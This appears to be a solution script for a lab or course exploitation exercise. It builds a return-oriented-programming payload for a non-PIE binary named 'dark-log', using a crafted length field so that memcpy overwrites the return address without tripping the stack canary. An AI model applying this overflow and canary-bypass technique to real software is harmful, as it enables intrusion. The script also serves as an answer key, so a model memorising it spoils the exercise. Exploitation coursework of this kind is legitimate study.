#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log."""
import struct
import sys


def p64(value):
    return struct.pack("<Q", value)


# dark-log is non-PIE, so these code addresses are fixed.
POP_RDI = 0x4018A3                         # pop rdi; ret (inside pop r15; ret)
RET = 0x4018B0                             # repz ret
GRADE_EVAL = 0x401677
START = 0x401590                           # _start, used for the exit-0 variant

# len = 0xa8 makes memcpy()'s destination `logMsg + len` equal to rbp+8,
# i.e. the return address.  The 128-byte copy then overwrites saved rbp/ret
# (and main's canary) but not input's canary at rbp-8, so input's check passes.
#
# The chain below reaches the return slot via memcpy, so expression[0] is the
# first gadget.  Replace `p64(START) + p64(0)` with `p64(0)` to use the
# ordinary variant: it prints and then crashes with exit status 139.
chain = (
    p64(POP_RDI) + p64(4)      # rdi = 4
    + p64(RET)                 # align rsp for grade_eval's printf
    + p64(GRADE_EVAL)          # grade_eval(4)
    + p64(START) + p64(0)      # exit 0: re-enter _start with argc = 0
).ljust(128, b"\x00")

# 128-byte chain + 128-byte logMsg filler + 4-byte len = 260 bytes.
# The terminating NUL goes to offset 260, while the canary is at offset 280.
payload = chain + b"A" * 128 + (0xA8).to_bytes(4, "little")

sys.stdout.buffer.write(payload)
